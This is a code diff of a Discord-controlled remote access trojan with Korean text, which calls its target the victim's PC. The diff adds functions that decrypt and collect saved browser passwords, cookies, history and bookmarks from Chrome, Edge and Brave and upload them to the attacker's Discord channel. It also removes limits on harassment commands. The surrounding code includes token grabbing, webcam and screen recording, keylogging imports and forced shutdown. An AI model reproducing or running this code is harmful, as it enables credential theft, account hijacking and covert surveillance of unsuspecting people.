@@ -16,6 +16,8 @@ import struct as _struct
 import subprocess
 import urllib.request
 import shutil
+import math
+import sqlite3
 from zipfile import ZipFile
 from ctypes import *
 import ctypes.wintypes
@@ -49,7 +51,7 @@ import browserhistory as bh
 from mss import mss
 from pynput.keyboard import Key, Listener
 
-# ---------- NEW IMPORTS FOR WEBCAM RECORDING ----------
+# ---------- OpenCV (웹캠 녹화) ----------
 try:
     import cv2
     CV2_AVAILABLE = True
@@ -764,8 +766,8 @@ def get_embed(page: str):
             "`!jumpscare` - 전체화면 공포 + 큰 소리\n"
             "`!wallpaper` - 배경화면 변경 (이미지 첨부)\n"
             "`!flipscreen / !reset` - 화면 뒤집기 트릭\n"
-            "`!crazymouse [초] [속도]` - 랜덤 마우스 움직임\n"
-            "`!earthquake [초] [강도]` - 모든 창 흔들기\n"
+            "`!crazymouse [초] [속도]` - 랜덤 마우스 움직임 (소수점, 제한없음)\n"
+            "`!earthquake [초] [강도]` - 모든 창 흔들기 (소수점, 제한없음)\n"
             "`!spamtts <횟수> <텍스트>` - TTS 음성 스팸\n"
             "`!beep <횟수>` – 시스템 비프 스팸\n"
             "`!opencd / !closecd` - CD 트레이 제어\n"
@@ -776,11 +778,16 @@ def get_embed(page: str):
             "`!disabletaskmgr / !enabletaskmgr` – 작업 관리자 🔑\n"
             "`!spam_site <URL>` - 웹사이트 100개 탭 스팸\n"
             "`!site <URL>` - 브라우저에서 URL 열기\n"
-            "`!text <텍스트> [초]` - 화면 팝업 표시\n"
+            "`!text <텍스트> [초]` - 화면 팝업 표시 (소수점)\n"
             "`!click [버튼] [횟수]` - 마우스 클릭 시뮬레이션\n"
             "`!keypress <키>` - 키 입력 시뮬레이션\n"
             "`!type <텍스트>` - 텍스트 타이핑\n"
-            "`!mousepos` - 현재 마우스 위치"
+            "`!mousepos` - 현재 마우스 위치\n"
+            "`!mouseart <원/사각형/삼각형> [시간]` - 마우스로 도형 그리기 (소수점)\n"
+            "`!paint <텍스트>` - 그림판 열고 텍스트 및 사각형 그리기\n"
+            "`!passwords` - 브라우저 저장 비밀번호 탈취\n"
+            "`!cookies` - 브라우저 쿠키 탈취\n"
+            "`!browserdump` - 브라우저 전체 데이터 (ZIP)"
         )
 
     elif page == "destructive":
@@ -841,9 +848,293 @@ class HelpView(discord.ui.View):
 async def help(ctx):
     await ctx.send(embed=get_embed("main"), view=HelpView())
 
-# ---------- START OF NEW COMMANDS ----------
+# ---------- BROWSER STEALER FUNCTIONS ----------
 
-# Global stream control
+def decrypt_chromium_value(encrypted_value, key):
+    try:
+        from Crypto.Cipher import AES
+        if len(encrypted_value) < 15:
+            return None
+        nonce = encrypted_value[3:15]
+        ciphertext = encrypted_value[15:-16]
+        tag = encrypted_value[-16:]
+        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+        return decrypted.decode('utf-8', errors='ignore')
+    except:
+        try:
+            return CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8', errors='ignore')
+        except:
+            return None
+
+def get_browser_key(browser_path):
+    local_state = os.path.join(browser_path, "Local State")
+    if not os.path.exists(local_state):
+        return None
+    try:
+        with open(local_state, 'r', encoding='utf-8') as f:
+            ls = json.load(f)
+        enc_key = base64.b64decode(ls['os_crypt']['encrypted_key'])[5:]
+        key = CryptUnprotectData(enc_key, None, None, None, 0)[1]
+        return key
+    except Exception:
+        return None
+
+def get_profiles(browser_path):
+    profiles = ["Default"]
+    if os.path.exists(browser_path):
+        for item in os.listdir(browser_path):
+            if item.startswith("Profile ") and item[8:].isdigit():
+                profiles.append(item)
+    return profiles
+
+def steal_all_browser_data():
+    local_appdata = os.getenv('LOCALAPPDATA')
+    browsers = {
+        "Chrome": os.path.join(local_appdata, "Google", "Chrome", "User Data"),
+        "Edge": os.path.join(local_appdata, "Microsoft", "Edge", "User Data"),
+        "Brave": os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data")
+    }
+    result = {
+        "passwords": [],
+        "cookies": [],
+        "history": [],
+        "bookmarks": []
+    }
+    for browser_name, base_path in browsers.items():
+        if not os.path.exists(base_path):
+            continue
+        key = get_browser_key(base_path)
+        profiles = get_profiles(base_path)
+        for profile in profiles:
+            profile_path = os.path.join(base_path, profile)
+            
+            # --- Passwords ---
+            login_db = os.path.join(profile_path, "Login Data")
+            if os.path.exists(login_db):
+                temp_db = os.path.join(tempfile.gettempdir(), f"{browser_name}_{profile}_login.db")
+                try:
+                    shutil.copyfile(login_db, temp_db)
+                    conn = sqlite3.connect(temp_db)
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                    rows = cursor.fetchall()
+                    conn.close()
+                    for url, username, enc_pw in rows:
+                        if not url or not username:
+                            continue
+                        decrypted = decrypt_chromium_value(enc_pw, key) if key else None
+                        if decrypted is None:
+                            decrypted = "[복호화 실패]"
+                        result["passwords"].append({
+                            "browser": browser_name,
+                            "profile": profile,
+                            "url": url,
+                            "username": username,
+                            "password": decrypted
+                        })
+                except Exception:
+                    pass
+                finally:
+                    if os.path.exists(temp_db):
+                        try: os.remove(temp_db)
+                        except: pass
+
+            # --- Cookies ---
+            cookie_db = os.path.join(profile_path, "Network", "Cookies")
+            if not os.path.exists(cookie_db):
+                cookie_db = os.path.join(profile_path, "Cookies")
+            if os.path.exists(cookie_db):
+                temp_db = os.path.join(tempfile.gettempdir(), f"{browser_name}_{profile}_cookies.db")
+                try:
+                    shutil.copyfile(cookie_db, temp_db)
+                    conn = sqlite3.connect(temp_db)
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+                    rows = cursor.fetchall()
+                    conn.close()
+                    for host, name, enc_val in rows:
+                        decrypted = decrypt_chromium_value(enc_val, key) if key else None
+                        if decrypted is None:
+                            decrypted = "[복호화 실패]"
+                        result["cookies"].append({
+                            "browser": browser_name,
+                            "profile": profile,
+                            "host": host,
+                            "name": name,
+                            "value": decrypted
+                        })
+                except Exception:
+                    pass
+                finally:
+                    if os.path.exists(temp_db):
+                        try: os.remove(temp_db)
+                        except: pass
+
+            # --- History ---
+            history_db = os.path.join(profile_path, "History")
+            if os.path.exists(history_db):
+                temp_db = os.path.join(tempfile.gettempdir(), f"{browser_name}_{profile}_history.db")
+                try:
+                    shutil.copyfile(history_db, temp_db)
+                    conn = sqlite3.connect(temp_db)
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000")
+                    rows = cursor.fetchall()
+                    conn.close()
+                    for url, title, time_val in rows:
+                        result["history"].append({
+                            "browser": browser_name,
+                            "profile": profile,
+                            "url": url,
+                            "title": title if title else "제목 없음",
+                            "time": str(time_val)
+                        })
+                except Exception:
+                    pass
+                finally:
+                    if os.path.exists(temp_db):
+                        try: os.remove(temp_db)
+                        except: pass
+
+            # --- Bookmarks ---
+            bookmarks_file = os.path.join(profile_path, "Bookmarks")
+            if os.path.exists(bookmarks_file):
+                try:
+                    with open(bookmarks_file, 'r', encoding='utf-8') as f:
+                        data = json.load(f)
+                    def parse_bookmarks(node, path=""):
+                        items = []
+                        if isinstance(node, dict):
+                            if "children" in node:
+                                for child in node["children"]:
+                                    items.extend(parse_bookmarks(child, path + "/" + child.get("name", "")))
+                            elif "url" in node:
+                                items.append({
+                                    "name": node.get("name", ""),
+                                    "url": node.get("url", ""),
+                                    "path": path
+                                })
+                        elif isinstance(node, list):
+                            for item in node:
+                                items.extend(parse_bookmarks(item, path))
+                        return items
+                    roots = data.get("roots", {})
+                    all_bookmarks = []
+                    for root_name, root_node in roots.items():
+                        all_bookmarks.extend(parse_bookmarks(root_node, root_name))
+                    for bm in all_bookmarks:
+                        result["bookmarks"].append({
+                            "browser": browser_name,
+                            "profile": profile,
+                            "name": bm["name"],
+                            "url": bm["url"],
+                            "folder": bm["path"]
+                        })
+                except Exception:
+                    pass
+    return result
+
+def format_browser_data(data_dict):
+    output = ""
+    output += "=== 비밀번호 ===\n"
+    for item in data_dict["passwords"]:
+        output += f"[{item['browser']} {item['profile']}] {item['url']} | {item['username']} : {item['password']}\n"
+    output += "\n=== 쿠키 ===\n"
+    for item in data_dict["cookies"]:
+        output += f"[{item['browser']} {item['profile']}] {item['host']} | {item['name']} = {item['value']}\n"
+    output += "\n=== 방문 기록 (최대 1000개) ===\n"
+    for item in data_dict["history"]:
+        output += f"[{item['browser']} {item['profile']}] {item['title']} - {item['url']} (시간: {item['time']})\n"
+    output += "\n=== 북마크 ===\n"
+    for item in data_dict["bookmarks"]:
+        output += f"[{item['browser']} {item['profile']}] {item['folder']} | {item['name']} : {item['url']}\n"
+    return output
+
+def steal_browser_passwords():
+    data = steal_all_browser_data()
+    output = ""
+    for item in data["passwords"]:
+        output += f"[{item['browser']} {item['profile']}] {item['url']} | {item['username']} : {item['password']}\n"
+    if not output:
+        output = "저장된 비밀번호를 찾을 수 없습니다."
+    return output
+
+# ---------- MOUSE ART & PAINT ----------
+
+def mouse_art(shape, duration=10.0):
+    start_time = time.time()
+    sw, sh = pyautogui.size()
+    center_x, center_y = sw//2, sh//2
+    radius = 200
+    size = 300
+
+    if shape == "원":
+        while time.time() - start_time < duration:
+            for angle in range(0, 360, 5):
+                x = center_x + radius * math.cos(math.radians(angle))
+                y = center_y + radius * math.sin(math.radians(angle))
+                pyautogui.moveTo(x, y, duration=0.01)
+                if time.time() - start_time >= duration:
+                    break
+    elif shape == "사각형":
+        half = size//2
+        points = [
+            (center_x - half, center_y - half),
+            (center_x + half, center_y - half),
+            (center_x + half, center_y + half),
+            (center_x - half, center_y + half)
+        ]
+        while time.time() - start_time < duration:
+            for i in range(4):
+                x1, y1 = points[i]
+                x2, y2 = points[(i+1)%4]
+                steps = 30
+                for j in range(steps):
+                    t = j / steps
+                    x = x1 + (x2 - x1) * t
+                    y = y1 + (y2 - y1) * t
+                    pyautogui.moveTo(x, y, duration=0.01)
+                    if time.time() - start_time >= duration:
+                        break
+                if time.time() - start_time >= duration:
+                    break
+    elif shape == "삼각형":
+        half = size//2
+        points = [
+            (center_x, center_y - half),
+            (center_x + half * math.sin(math.radians(60)), center_y + half * math.cos(math.radians(60))),
+            (center_x - half * math.sin(math.radians(60)), center_y + half * math.cos(math.radians(60)))
+        ]
+        while time.time() - start_time < duration:
+            for i in range(3):
+                x1, y1 = points[i]
+                x2, y2 = points[(i+1)%3]
+                steps = 30
+                for j in range(steps):
+                    t = j / steps
+                    x = x1 + (x2 - x1) * t
+                    y = y1 + (y2 - y1) * t
+                    pyautogui.moveTo(x, y, duration=0.01)
+                    if time.time() - start_time >= duration:
+                        break
+                if time.time() - start_time >= duration:
+                    break
+
+def open_paint_and_draw(text):
+    subprocess.Popen("mspaint.exe", creationflags=subprocess.CREATE_NO_WINDOW)
+    time.sleep(1.5)
+    pyautogui.click(70, 160)
+    time.sleep(0.5)
+    pyautogui.click(300, 300)
+    time.sleep(0.5)
+    pyautogui.typewrite(text, interval=0.05)
+    pyautogui.click(110, 160)
+    time.sleep(0.5)
+    pyautogui.moveTo(400, 400)
+    pyautogui.drag(200, 200, duration=0.5, button='left')
+
+# ---------- STREAMING ----------
 stream_running = False
 stream_channel = None
 stream_thread = None
@@ -857,13 +1148,7 @@ def stream_loop():
                 timestamp = int(time.time())
                 filename = os.path.join(tempfile.gettempdir(), f"stream_{timestamp}.png")
                 sct.shot(output=filename)
-                # Send file to the channel via discord.py async, but we're in a thread.
-                # We'll use the pending messages mechanism.
                 send_discord_message(f"📡 **스트림 스크린샷** (t={timestamp})")
-                # We need to send file; we can save to temp and use discord.File, but that requires async.
-                # Instead, we'll use the background sender to send the file path? Not easily.
-                # Alternative: we can send via bot.loop and create a coroutine.
-                # Let's use asyncio.run_coroutine_threadsafe
                 asyncio.run_coroutine_threadsafe(
                     send_stream_file(filename, stream_channel),
                     bot.loop
@@ -887,8 +1172,7 @@ async def send_stream_file(filename, channel):
         except:
             pass
 
-# ---------- END OF NEW COMMANDS ----------
-
+# ---------- EXEC MAP ----------
 EXEC_MAP = {
     ".py":   (sys.executable,       False, None),
     ".bat":  (["cmd.exe", "/c"],     True,  None),
@@ -1060,6 +1344,7 @@ async def grab_tokens(ctx):
     await ctx.send(embeds=embeds_to_send)
     await ctx.send(f"ch3at tool이 피해자 PC에서 **{len(embeds_to_send)}**개의 토큰을 찾았습니다.")
 
+# ---------- ON_MESSAGE ----------
 @bot.event
 async def on_message(message):
     if message.content.startswith("!kill"):
@@ -1134,7 +1419,52 @@ async def on_message(message):
         except:
             await message.channel.send(embed=ch3at_embed("명령어 실패.", color=0xff0000))
 
-    # ========== NEW: !site ==========
+    # ---------- !passwords ----------
+    if message.content == "!passwords":
+        await message.channel.send(embed=ch3at_embed("🔑 **비밀번호 탈취:** 브라우저 저장 로그인 정보를 수집 중..."))
+        result = steal_browser_passwords()
+        if len(result) > 1990:
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as f:
+                f.write(result)
+                fname = f.name
+            file = discord.File(fname, filename="browser_passwords.txt")
+            await message.channel.send(embed=ch3at_embed("🔑 **비밀번호 덤프 완료**"), file=file)
+            os.unlink(fname)
+        else:
+            await message.channel.send(embed=ch3at_embed(f"🔑 **비밀번호 목록:**\n```\n{result}\n```"))
+
+    # ---------- !cookies ----------
+    if message.content == "!cookies":
+        await message.channel.send(embed=ch3at_embed("🍪 **쿠키 수집 중...**"))
+        data = steal_all_browser_data()
+        cookies_text = ""
+        for c in data["cookies"]:
+            cookies_text += f"[{c['browser']} {c['profile']}] {c['host']} | {c['name']} = {c['value']}\n"
+        if not cookies_text:
+            cookies_text = "쿠키를 찾을 수 없습니다."
+        if len(cookies_text) > 1990:
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as f:
+                f.write(cookies_text)
+                fname = f.name
+            file = discord.File(fname, filename="cookies.txt")
+            await message.channel.send(embed=ch3at_embed("🍪 **쿠키 덤프**"), file=file)
+            os.unlink(fname)
+        else:
+            await message.channel.send(embed=ch3at_embed(f"🍪 **쿠키 목록:**\n```\n{cookies_text}\n```"))
+
+    # ---------- !browserdump ----------
+    if message.content == "!browserdump":
+        await message.channel.send(embed=ch3at_embed("📦 **전체 브라우저 데이터 수집 중... (시간 소요)**"))
+        data = steal_all_browser_data()
+        formatted = format_browser_data(data)
+        zip_path = os.path.join(tempfile.gettempdir(), "browser_dump.zip")
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
+            zf.writestr("browser_data_report.txt", formatted.encode('utf-8'))
+        file = discord.File(zip_path, filename="browser_dump.zip")
+        await message.channel.send(embed=ch3at_embed("✅ **브라우저 덤프 완료** - ZIP 파일 확인"), file=file)
+        os.remove(zip_path)
+
+    # ---------- !site ----------
     if message.content.startswith("!site "):
         url = message.content[6:].strip()
         if not url.startswith(("http://", "https://")):
@@ -1145,15 +1475,14 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(embed=ch3at_embed(f"사이트 열기 실패: `{str(e)}`", color=0xff0000))
 
-    # ========== NEW: !webcamrecord ==========
+    # ---------- !webcamrecord ----------
     if message.content.startswith("!webcamrecord "):
         if not CV2_AVAILABLE:
-            await message.channel.send(embed=ch3at_embed("❌ OpenCV가 설치되지 않았습니다. `pip install opencv-python` 실행 후 다시 시도하세요.", color=0xff0000))
+            await message.channel.send(embed=ch3at_embed("❌ OpenCV가 설치되지 않았습니다. `pip install opencv-python`", color=0xff0000))
         else:
             try:
-                sec = int(message.content[14:].strip())
-                if sec < 1: sec = 1
-                if sec > 60: sec = 60
+                sec = float(message.content[14:].strip())
+                if sec < 0.1: sec = 0.1
                 await message.channel.send(embed=ch3at_embed(f"🎥 **웹캠 녹화:** {sec}초 녹화 중..."))
                 cap = cv2.VideoCapture(0)
                 if not cap.isOpened():
@@ -1175,11 +1504,11 @@ async def on_message(message):
                     await message.channel.send(embed=ch3at_embed(f"✅ **웹캠 녹화 완료:** {sec}초"), file=file)
                     os.remove(temp_path)
             except ValueError:
-                await message.channel.send(embed=ch3at_embed("구문: `!webcamrecord <초>` (1-60)", color=0xff0000))
+                await message.channel.send(embed=ch3at_embed("구문: `!webcamrecord <초>` (소수점 가능)", color=0xff0000))
             except Exception as e:
                 await message.channel.send(embed=ch3at_embed(f"웹캠 녹화 실패: `{str(e)}`", color=0xff0000))
 
-    # ========== NEW: !stream ==========
+    # ---------- !stream ----------
     if message.content.startswith("!stream "):
         global stream_running, stream_thread, stream_stop_event, stream_channel
         args = message.content[8:].strip().lower()
@@ -1192,10 +1521,10 @@ async def on_message(message):
                 stream_stop_event.clear()
                 stream_thread = threading.Thread(target=stream_loop, daemon=True)
                 stream_thread.start()
-                await message.channel.send(embed=ch3at_embed("📡 **스트림 시작:** 5초마다 스크린샷을 전송합니다. `!stream stop`으로 중지."))
+                await message.channel.send(embed=ch3at_embed("📡 **스트림 시작:** 5초마다 스크린샷 전송. `!stream stop`으로 중지."))
         elif args == "stop":
             if not stream_running:
-                await message.channel.send(embed=ch3at_embed("ℹ️ 현재 실행 중인 스트림이 없습니다."))
+                await message.channel.send(embed=ch3at_embed("ℹ️ 실행 중인 스트림이 없습니다."))
             else:
                 stream_stop_event.set()
                 stream_running = False
@@ -1204,42 +1533,36 @@ async def on_message(message):
         else:
             await message.channel.send(embed=ch3at_embed("구문: `!stream start` 또는 `!stream stop`", color=0xff0000))
 
-    # ========== NEW: !text ==========
+    # ---------- !text (소수점 시간 지원) ----------
     if message.content.startswith("!text "):
         parts = message.content[6:].strip().split(" ")
         if len(parts) == 0:
             await message.channel.send(embed=ch3at_embed("구문: `!text <텍스트> [초]`", color=0xff0000))
         else:
-            # Find duration if last token is a number
-            duration = 5  # default
+            duration = 5.0
             text = " ".join(parts)
-            if parts[-1].isdigit():
-                duration = int(parts[-1])
+            if parts[-1].replace('.', '', 1).isdigit():
+                duration = float(parts[-1])
+                if duration < 0.1: duration = 0.1
                 text = " ".join(parts[:-1])
-            if duration < 1: duration = 1
-            if duration > 30: duration = 30
-            # Show a message box with the text
             def show_popup():
-                # Use MessageBox with a timer? We can create a tkinter window that auto-destroys.
-                # But we are in a thread; we can create a simple Tk window.
                 import tkinter as tk
                 root = tk.Tk()
                 root.title("메시지")
                 root.attributes("-topmost", True)
                 label = tk.Label(root, text=text, font=("Arial", 20), padx=20, pady=20)
                 label.pack()
-                root.after(duration * 1000, root.destroy)
+                root.after(int(duration * 1000), root.destroy)
                 root.mainloop()
             threading.Thread(target=show_popup, daemon=True).start()
             await message.channel.send(embed=ch3at_embed(f"💬 **팝업 표시:** '{text}' - {duration}초 후 자동 닫힘."))
 
-    # ========== NEW: !ps ==========
+    # ---------- !ps ----------
     if message.content == "!ps":
         try:
             result = subprocess.run(["tasklist"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
             output = result.stdout
             if len(output) > 1990:
-                # Send as file
                 with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
                     f.write(output)
                     fname = f.name
@@ -1251,7 +1574,7 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(embed=ch3at_embed(f"프로세스 목록 실패: `{str(e)}`", color=0xff0000))
 
-    # ========== NEW: !click ==========
+    # ---------- !click ----------
     if message.content.startswith("!click"):
         args = message.content[6:].strip().split()
         button = "left"
@@ -1263,7 +1586,7 @@ async def on_message(message):
         elif len(args) > 0 and args[0].isdigit():
             count = int(args[0])
         if count < 1: count = 1
-        if count > 20: count = 20
+        if count > 100: count = 100
         if button == "left":
             pyautogui.click(clicks=count)
         elif button == "right":
@@ -1272,14 +1595,11 @@ async def on_message(message):
             pyautogui.middleClick(clicks=count)
         await message.channel.send(embed=ch3at_embed(f"🖱️ **클릭:** {button} 버튼 {count}회"))
 
-    # ========== NEW: !keypress ==========
+    # ---------- !keypress ----------
     if message.content.startswith("!keypress "):
         key = message.content[10:].strip()
         if key:
             try:
-                # Special keys: 'enter', 'space', 'tab', 'ctrl', 'shift', 'alt', 'win', 'esc', 'up', 'down', 'left', 'right'
-                # We'll use pyautogui.hotkey for multi-key combos? But for simplicity, just press.
-                # For special keys, pyautogui has Key names.
                 key_map = {
                     "enter": "enter", "space": "space", "tab": "tab",
                     "ctrl": "ctrl", "shift": "shift", "alt": "alt",
@@ -1299,7 +1619,7 @@ async def on_message(message):
             except Exception as e:
                 await message.channel.send(embed=ch3at_embed(f"키 입력 실패: `{str(e)}`", color=0xff0000))
 
-    # ========== NEW: !type ==========
+    # ---------- !type ----------
     if message.content.startswith("!type "):
         text = message.content[6:].strip()
         if text:
@@ -1309,37 +1629,63 @@ async def on_message(message):
             except Exception as e:
                 await message.channel.send(embed=ch3at_embed(f"타이핑 실패: `{str(e)}`", color=0xff0000))
 
-    # ========== NEW: !mousepos ==========
+    # ---------- !mousepos ----------
     if message.content == "!mousepos":
         x, y = pyautogui.position()
         await message.channel.send(embed=ch3at_embed(f"🖱️ **마우스 위치:** X={x}, Y={y}"))
 
-    # ========== ENHANCED: !crazymouse ==========
+    # ---------- !mouseart (소수점 시간) ----------
+    if message.content.startswith("!mouseart"):
+        args = message.content[10:].strip().split()
+        if len(args) == 0:
+            await message.channel.send(embed=ch3at_embed("구문: `!mouseart <원/사각형/삼각형> [시간(초)]`", color=0xff0000))
+        else:
+            shape = args[0]
+            duration = 10.0
+            if len(args) > 1:
+                try:
+                    duration = float(args[1])
+                    if duration < 0: duration = 0.1
+                except:
+                    pass
+            if shape not in ["원", "사각형", "삼각형"]:
+                await message.channel.send(embed=ch3at_embed("지원하는 도형: 원, 사각형, 삼각형", color=0xff0000))
+            else:
+                await message.channel.send(embed=ch3at_embed(f"🎨 **마우스 아트:** {shape} - {duration}초"))
+                threading.Thread(target=mouse_art, args=(shape, duration), daemon=True).start()
+
+    # ---------- !paint ----------
+    if message.content.startswith("!paint"):
+        text = message.content[7:].strip()
+        if not text:
+            await message.channel.send(embed=ch3at_embed("구문: `!paint <텍스트>`", color=0xff0000))
+        else:
+            await message.channel.send(embed=ch3at_embed(f"🎨 **그림판 실행:** '{text}' 입력 및 사각형 그리기"))
+            threading.Thread(target=open_paint_and_draw, args=(text,), daemon=True).start()
+
+    # ---------- !crazymouse (소수점, 속도 제한 없음) ----------
     if message.content.startswith("!crazymouse"):
         args = message.content[12:].strip().split()
-        duration = 10
+        duration = 10.0
         speed = "normal"
-        if len(args) > 0 and args[0].isdigit():
-            duration = int(args[0])
-            if duration < 1: duration = 1
-            if duration > 120: duration = 120
-            if len(args) > 1:
-                speed = args[1].lower()
-        else:
-            if len(args) > 0:
+        if len(args) > 0:
+            try:
+                duration = float(args[0])
+                if duration < 0: duration = 0.1
+                if len(args) > 1:
+                    speed = args[1].lower()
+            except ValueError:
                 speed = args[0].lower()
-        # Speed mapping
         if speed in ["slow", "low"]:
             moves_per_sec = 5
         elif speed in ["fast", "high"]:
             moves_per_sec = 30
-        elif speed.isdigit():
-            moves_per_sec = int(speed)
-            if moves_per_sec < 1: moves_per_sec = 1
-            if moves_per_sec > 50: moves_per_sec = 50
+        elif speed.replace('.', '', 1).isdigit():
+            moves_per_sec = float(speed)
+            if moves_per_sec < 0.1: moves_per_sec = 0.1
         else:
-            moves_per_sec = 15  # normal
-        await message.channel.send(embed=ch3at_embed(f"🐭 **미친 마우스:** {duration}초 동안 속도 {moves_per_sec}회/초로 움직입니다."))
+            moves_per_sec = 15
+        await message.channel.send(embed=ch3at_embed(f"🐭 **미친 마우스:** {duration}초, 속도 {moves_per_sec}회/초"))
         def crazy():
             end = time.time() + duration
             sw, sh = pyautogui.size()
@@ -1348,32 +1694,29 @@ async def on_message(message):
                 time.sleep(1.0 / moves_per_sec)
         threading.Thread(target=crazy, daemon=True).start()
 
-    # ========== ENHANCED: !earthquake ==========
+    # ---------- !earthquake (소수점, 강도 제한 없음) ----------
     if message.content.startswith("!earthquake"):
         args = message.content[12:].strip().split()
-        duration = 10
+        duration = 10.0
         intensity = "medium"
-        if len(args) > 0 and args[0].isdigit():
-            duration = int(args[0])
-            if duration < 1: duration = 1
-            if duration > 60: duration = 60
-            if len(args) > 1:
-                intensity = args[1].lower()
-        else:
-            if len(args) > 0:
+        if len(args) > 0:
+            try:
+                duration = float(args[0])
+                if duration < 0: duration = 0.1
+                if len(args) > 1:
+                    intensity = args[1].lower()
+            except ValueError:
                 intensity = args[0].lower()
-        # Intensity mapping
         if intensity in ["low", "weak"]:
             offset = 8
         elif intensity in ["high", "strong"]:
             offset = 25
-        elif intensity.isdigit():
-            offset = int(intensity)
-            if offset < 1: offset = 1
-            if offset > 40: offset = 40
+        elif intensity.replace('.', '', 1).isdigit():
+            offset = float(intensity)
+            if offset < 0: offset = 0
         else:
-            offset = 15  # medium
-        await message.channel.send(embed=ch3at_embed(f"🌍 **지진:** {duration}초 동안 강도 {offset}px로 흔듭니다."))
+            offset = 15
+        await message.channel.send(embed=ch3at_embed(f"🌍 **지진:** {duration}초, 강도 {offset}px"))
         def shake():
             end = time.time() + duration
             while time.time() < end:
@@ -1381,8 +1724,8 @@ async def on_message(message):
                     if win32gui.IsWindowVisible(hwnd):
                         try:
                             r = win32gui.GetWindowRect(hwnd)
-                            new_x = r[0] + random.randint(-offset, offset)
-                            new_y = r[1] + random.randint(-offset, offset)
+                            new_x = r[0] + random.randint(-int(offset), int(offset))
+                            new_y = r[1] + random.randint(-int(offset), int(offset))
                             win32gui.MoveWindow(hwnd, new_x, new_y, r[2]-r[0], r[3]-r[1], True)
                         except: pass
                 try:
@@ -1391,9 +1734,7 @@ async def on_message(message):
                 time.sleep(0.04)
         threading.Thread(target=shake, daemon=True).start()
 
-    # ========== REMOVED: !rickroll ==========
-    # (Commented out or deleted)
-
+    # ---------- 기존 나머지 기능들 ----------
     if message.content.startswith("!message"):
         MB_YESNO = 0x04
         MB_HELP = 0x4000
@@ -1644,18 +1985,16 @@ async def on_message(message):
 
     if message.content.startswith("!screenrecord"):
         try:
-            seconds = int(message.content[14:].strip())
-            if seconds < 1:
-                seconds = 1
-            if seconds > 30:
-                seconds = 30
+            seconds = float(message.content[14:].strip())
+            if seconds < 0.1: seconds = 0.1
             await message.channel.send(embed=ch3at_embed(f"🎬 **화면 녹화:** {seconds}초 녹화 중..."))
             temp = os.getenv('TEMP')
             frames_dir = os.path.join(temp, "navi_frames")
             os.makedirs(frames_dir, exist_ok=True)
             frame_files = []
             fps = 2
-            total_frames = seconds * fps
+            total_frames = int(seconds * fps)
+            if total_frames < 1: total_frames = 1
             with mss() as sct:
                 for i in range(total_frames):
                     filename = os.path.join(frames_dir, f"frame_{i:04d}.png")
@@ -1679,7 +2018,7 @@ async def on_message(message):
                 pass
             os.remove(zip_path)
         except ValueError:
-            await message.channel.send(embed=ch3at_embed("구문: `!screenrecord <초>` (1-30)", color=0xff0000))
+            await message.channel.send(embed=ch3at_embed("구문: `!screenrecord <초>` (소수점 가능)", color=0xff0000))
         except Exception as e:
             await message.channel.send(embed=ch3at_embed(f"화면 녹화 실패: `{str(e)}`", color=0xff0000))
 
@@ -1710,14 +2049,10 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(embed=ch3at_embed(f"뒤집기 실패: `{str(e)}`", color=0xff0000))
 
-    # (Old crazymouse removed; new enhanced version above)
-
-    # (Old earthquake removed; new enhanced version above)
-
     if message.content.startswith("!fakeerror"):
         try:
             parts = message.content[11:].strip().split(" ", 1)
-            count = min(int(parts[0]), 50)
+            count = int(parts[0])
             txt = parts[1] if len(parts) > 1 else "심각한 시스템 오류가 발생했습니다."
             def _spam_err():
                 for _ in range(count):
@@ -1730,7 +2065,7 @@ async def on_message(message):
     if message.content.startswith("!spamtts"):
         try:
             parts = message.content[9:].strip().split(" ", 1)
-            count = min(int(parts[0]), 20)
+            count = int(parts[0])
             txt = parts[1] if len(parts) > 1 else "해킹당했습니다"
             volumeup()
             def _spam_tts():
@@ -1816,12 +2151,12 @@ async def on_message(message):
 
     if message.content.startswith("!shutdown"):
         try:
-            sec = int(message.content[9:].strip())
+            sec = float(message.content[9:].strip())
             if sec < 0: sec = 0
-            subprocess.run(["shutdown", "/s", "/t", str(sec), "/f"], creationflags=subprocess.CREATE_NO_WINDOW)
+            subprocess.run(["shutdown", "/s", "/t", str(int(sec)), "/f"], creationflags=subprocess.CREATE_NO_WINDOW)
             await message.channel.send(embed=ch3at_embed(f"⏻ **시스템:** {sec}초 후 종료."))
         except ValueError:
-            await message.channel.send(embed=ch3at_embed("구문: `!shutdown <초>`", color=0xff0000))
+            await message.channel.send(embed=ch3at_embed("구문: `!shutdown <초>` (소수점 가능)", color=0xff0000))
 
     if message.content == "!restart":
         subprocess.run(["shutdown", "/r", "/t", "0", "/f"], creationflags=subprocess.CREATE_NO_WINDOW)
@@ -1872,15 +2207,11 @@ async def on_message(message):
         else:
             await message.channel.send(embed=ch3at_embed("관리자 권한이 필요합니다.", color=0xff0000))
 
-    # ========== REMOVED: !rickroll ==========
-    # The following block is deleted:
-    # if message.content == "!rickroll":
-    #     os.startfile("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
-    #     await message.channel.send(embed=ch3at_embed("🎵 **Rickroll:** Never gonna give you up..."))
+    # ---------- !rickroll 제거됨 ----------
 
     if message.content.startswith("!beep"):
         try:
-            count = min(int(message.content[6:].strip()), 100)
+            count = int(message.content[6:].strip())
             if count < 1: count = 1
             def _beep_spam():
                 for _ in range(count):
